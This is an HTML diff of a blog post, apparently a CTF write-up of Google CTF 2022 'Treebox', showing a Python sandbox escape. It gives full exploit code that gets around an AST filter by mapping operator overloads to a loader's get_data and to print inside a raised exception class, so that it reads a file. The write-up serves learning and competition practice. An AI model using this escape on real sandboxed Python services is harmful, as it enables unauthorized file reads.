@@ -15,11 +15,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
 
   
-  <title>lavafroth</title>
+  <title>Google CTF 2022 Treebox - lavafroth</title>
 
   
   
-  <meta name="description" content="" />
+  <meta name="description" content="This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren&rsquo;t any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at flag. We also can&rsquo;t import any modules explicitly. If we read the source code provided for the challenge, we can observe that the sys module is already imported." />
   <meta name="author" content="" />
   
 
@@ -27,6 +27,13 @@
   
   <link rel="preload stylesheet" as="style" href="https://lavafroth.github.io/app.css" />
 
+  
+  <link rel="preload stylesheet" as="style" href="https://lavafroth.github.io/an-old-hope.min.css" />
+  <script
+    defer
+    src="https://lavafroth.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
   
 
   
@@ -44,13 +51,6 @@
   <meta name="generator" content="Hugo 0.103.1" />
 
   
-  
-  <link
-    rel="alternate"
-    type="application/rss&#43;xml"
-    href="https://lavafroth.github.io/index.xml"
-    title="lavafroth"
-  />
   
 </head>
 
@@ -78,9 +78,9 @@
 
     
     
-    <a class="sidebar-nav-item" href="./about/" title="About me" style="background: url(/about.svg) center center no-repeat"></a>
+    <a class="sidebar-nav-item" href="../../about/" title="About me" style="background: url(/about.svg) center center no-repeat"></a>
     
-    <a class="sidebar-nav-item" href="./art/" title="Digital art" style="background: url(/art.svg) center center no-repeat"></a>
+    <a class="sidebar-nav-item" href="../../art/" title="Digital art" style="background: url(/art.svg) center center no-repeat"></a>
     
 </nav>
 
@@ -251,87 +251,66 @@
 
     <main class="main">
 
+<article class="post-single">
+  <header class="post-title">
+    <p>
+      <time>Aug 19, 2022</time>
+      
+    </p>
+    <h1>Google CTF 2022 Treebox</h1>
+  </header>
+  <section class="post-content"><p>This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren&rsquo;t any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at <code>flag</code>. We also can&rsquo;t import any modules explicitly. If we read the source code provided for the challenge, we can observe that the <code>sys</code> module is already imported. We can piggyback on this fact to use its modules.</p>
+<p>We shall, however, first find all the modules in <code>sys.modules</code> that have a <code>get_data</code> like function in their <code>__loader__</code> attribute. To do so, we run the following locally:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> name, handle <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>modules<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> loader <span style="color:#f92672">:=</span> getattr(handle, <span style="color:#e6db74">&#39;__loader__&#39;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> loader_function_name <span style="color:#f92672">in</span> dir(loader):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;get_data&#39;</span> <span style="color:#f92672">in</span> loader_function_name:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;sys.modules[&#39;</span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;].__loader__.</span><span style="color:#e6db74">{</span>loader_function_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>From the output we get, this looks the most promising:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#34;os&#34;</span>]<span style="color:#f92672">.</span>__loader__<span style="color:#f92672">.</span>get_data
+</span></span></code></pre></div><p>Now we can slowly assemble our exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Read</span>(<span style="color:#a6e22e">BaseException</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set the addition operator to the str function</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># so that we can use it to stringify bytes-like</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># objects.</span>
+</span></span><span style="display:flex;"><span>    __add__ <span style="color:#f92672">=</span> str
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set the division operator to os.loader.get_data method</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># which can be used to read the raw bytes from a file.</span>
+</span></span><span style="display:flex;"><span>    __truediv__ <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#34;os&#34;</span>]<span style="color:#f92672">.</span>__loader__<span style="color:#f92672">.</span>get_data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set the indexing operator to print, which we&#39;ll use to</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print the flag</span>
+</span></span><span style="display:flex;"><span>    __getitem__ <span style="color:#f92672">=</span> print
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Now we read the raw bytes of the file &#34;flag&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># stringify it and finally print it</span>
+</span></span><span style="display:flex;"><span>        self[self <span style="color:#f92672">+</span> self <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;flag&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Raise the exception</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span> Read
+</span></span></code></pre></div></section>
 
-
-
-
-
- 
-
-
-
- 
-<article class="post-entry">
-  <h2>Google CTF 2022 Treebox</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/google-ctf-2022-treebox/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF I Saw a Little Elf</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/r0-i-saw-a-little-elf/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Hash Me Reloaded</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/r0-hash-me-reloaded/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Hash Me Please</h2>
-  <time>Aug 19, 2022</time>
-  <a href="https://lavafroth.github.io/post/r0-hash-me-please/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>Oh my God, they killed Kenny!</h2>
-  <time>Aug 2, 2022</time>
-  <a href="https://lavafroth.github.io/post/oh-my-god-they-killed-kenny/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Bash Jail 3</h2>
-  <time>Jul 24, 2022</time>
-  <a href="https://lavafroth.github.io/post/ringzer0ctf-bash-jail3/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Bash Jail 2</h2>
-  <time>Jul 24, 2022</time>
-  <a href="https://lavafroth.github.io/post/ringzer0ctf-bash-jail2/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>RingZer0 CTF Bash Jail 1</h2>
-  <time>Jul 24, 2022</time>
-  <a href="https://lavafroth.github.io/post/ringzer0ctf-bash-jail1/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>Operation Oni, Operation Orchid - Forensics Challenges | PicoCTF 2022</h2>
-  <time>Mar 18, 2022</time>
-  <a href="https://lavafroth.github.io/post/picoctf-2022-forensics-challenges-operation-oni-operation-orchid/"></a>
-</article>
-
-<article class="post-entry">
-  <h2>PicoCTF web challenge: JAuth</h2>
-  <time>Feb 22, 2022</time>
-  <a href="https://lavafroth.github.io/post/picoctf-web-challenge-jauth/"></a>
-</article>
-
-
-
-
-<nav class="main-nav">
   
   
-  <a class="next" href="./page/2/">Next Page →</a>
+
   
-</nav>
-
-
+  
+  
+  <nav class="post-nav">
+     
+    <a class="next" href="https://lavafroth.github.io/post/r0-i-saw-a-little-elf/"><span>RingZer0 CTF I Saw a Little Elf</span><span>→</span></a>
+    
+  </nav>
+  
+</article>
 </main>
 
     <footer class="footer">
